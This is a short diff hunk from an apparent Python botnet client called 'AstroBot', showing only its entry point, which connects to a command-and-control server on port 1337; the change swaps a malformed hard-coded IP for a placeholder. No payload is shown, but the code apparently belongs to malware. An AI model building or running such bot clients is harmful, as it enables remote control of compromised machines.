@@ -99,6 +99,6 @@ if __name__ == "__main__":
     if len(sys.argv) > 1:
         bot = AstroBot(cnc_ip=sys.argv[1], cnc_port=int(sys.argv[2]))
     else:
-        bot = AstroBot(cnc_ip="181.2.28292.", cnc_port=1337)  # Cambia por tu IP
+        bot = AstroBot(cnc_ip="IP_DEL_CNC", cnc_port=1337)  # Cambia por tu IP
     
     bot.connect()
